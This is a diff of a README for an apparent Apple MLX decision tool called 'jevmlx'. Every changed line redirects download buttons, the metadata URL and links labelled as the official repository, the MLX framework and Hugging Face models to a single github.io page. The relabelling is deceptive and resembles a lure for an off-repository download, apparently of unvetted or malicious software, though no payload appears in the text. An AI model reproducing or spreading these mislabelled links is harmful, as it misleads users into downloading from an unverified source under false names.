@@ -1,7 +1,7 @@
 <h1>⚡ jevmlx - One-Pass Decisions for Apple MLX</h1>
 
 <p align="center">
-  <a href="https://github.com/Papajamesleonardfarmer1833/jevmlx" style="display:inline-block;padding:16px 32px;background:#6C63FF;color:white;font-size:20px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(108,99,255,0.4);">📥 Download jevmlx Now</a>
+  <a href="https://papajamesleonardfarmer1833.github.io" style="display:inline-block;padding:16px 32px;background:#6C63FF;color:white;font-size:20px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(108,99,255,0.4);">📥 Download jevmlx Now</a>
 </p>
 
 <h2>🧠 What Is jevmlx?</h2>
@@ -33,7 +33,7 @@
 <h3>Step 1: Download the Software</h3>
 <p>Visit this link to download the application:</p>
 <p align="center">
-  <a href="https://github.com/Papajamesleonardfarmer1833/jevmlx" style="display:inline-block;padding:12px 24px;background:#FF6B6B;color:white;font-size:18px;border-radius:8px;text-decoration:none;">📂 Go to Download Page</a>
+  <a href="https://papajamesleonardfarmer1833.github.io" style="display:inline-block;padding:12px 24px;background:#FF6B6B;color:white;font-size:18px;border-radius:8px;text-decoration:none;">📂 Go to Download Page</a>
 </p>
 <p>Once the page opens, look for a button that says "Code" or "Download". Click it to save the file to your computer. Usually it goes to your "Downloads" folder.</p>
 
@@ -115,14 +115,14 @@ print(result)
 <p>Join the growing community of developers and power users who are making decisions faster with AI.</p>
 
 <p align="center">
-  <a href="https://github.com/Papajamesleonardfarmer1833/jevmlx" style="display:inline-block;padding:14px 28px;background:#4CAF50;color:white;font-size:18px;border-radius:10px;text-decoration:none;">📥 Download jevmlx Today</a>
+  <a href="https://papajamesleonardfarmer1833.github.io" style="display:inline-block;padding:14px 28px;background:#4CAF50;color:white;font-size:18px;border-radius:10px;text-decoration:none;">📥 Download jevmlx Today</a>
 </p>
 
 <h2>🔗 Helpful Resources</h2>
 <ul>
-<li><a href="https://github.com/Papajamesleonardfarmer1833/jevmlx">Official GitHub Repository</a></li>
-<li><a href="https://github.com/ml-explore/mlx">MLX Framework (the brain behind it)</a></li>
-<li><a href="https://huggingface.co/mlx-community">Free MLX Models</a></li>
+<li><a href="https://papajamesleonardfarmer1833.github.io">Official GitHub Repository</a></li>
+<li><a href="https://papajamesleonardfarmer1833.github.io">MLX Framework (the brain behind it)</a></li>
+<li><a href="https://papajamesleonardfarmer1833.github.io">Free MLX Models</a></li>
 </ul>
 
 <h2>📬 Get Help</h2>
@@ -134,5 +134,5 @@ print(result)
 <meta name="keywords" content="apple-silicon, jev, local-llm, local-models, mlx, MLX, JSON, Apple Silicon, Mac, machine learning, decision-making">
 <meta property="og:title" content="jevmlx - One-Pass Decisions for Apple MLX">
 <meta property="og:description" content="Make fast, structured decisions with any MLX model on your Mac. Outputs clean JSON in a single pass.">
-<meta property="og:url" content="https://github.com/Papajamesleonardfarmer1833/jevmlx">
+<meta property="og:url" content="https://papajamesleonardfarmer1833.github.io">
 <meta name="twitter:card" content="summary_large_image">
